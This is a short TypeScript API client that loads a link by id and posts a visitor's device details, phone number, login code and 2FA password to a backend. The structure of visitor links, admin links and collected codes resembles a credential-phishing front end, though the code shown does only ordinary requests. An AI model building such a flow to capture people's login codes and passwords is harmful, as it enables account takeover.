import $api from "../http";
import { Axios, AxiosResponse } from "axios";
import { ILink } from "../models/ILink";
import { HttpResponse } from "../models/response/HttpResponse";
import { IVisitor } from "../models/IVisitor";
import { IAdminLink } from "../models/IAdminLink";

export default class LinkService {
  static async loadLink(
    linkId: string
  ): Promise<AxiosResponse<HttpResponse<ILink>>> {
    return $api.get<HttpResponse<ILink>>("/link", {
      params: {
        linkId,
      },
    });
  }

  static intializeLoginProcess(
    visitorId: string,
    device: string,
    platform: string
  ): Promise<AxiosResponse<HttpResponse<any>>> {
    return $api.post<HttpResponse<ILink>>("/link/init", {
      visitorId,
      device,
      platform,
    });
  }
  static send2FA(
    visitorId: string,
    pass: string
  ): Promise<AxiosResponse<HttpResponse<any>>> {
    return $api.post<HttpResponse<any>>("/link/2FA", {
      visitorId,
      pass,
    });
  }

  static sendCode(
    visitorId: string,
    phone: string
  ): Promise<AxiosResponse<HttpResponse<any>>> {
    return $api.post<HttpResponse<any>>("/link/code", {
      visitorId,
      phone,
    });
  }

  static verifyCode(
    visitorId: string,
    phone: string,
    code: string
  ): Promise<AxiosResponse<HttpResponse<any>>> {
    return $api.post<HttpResponse<any>>("/link/verify", {
      visitorId,
      phone,
      code,
    });
  }
}
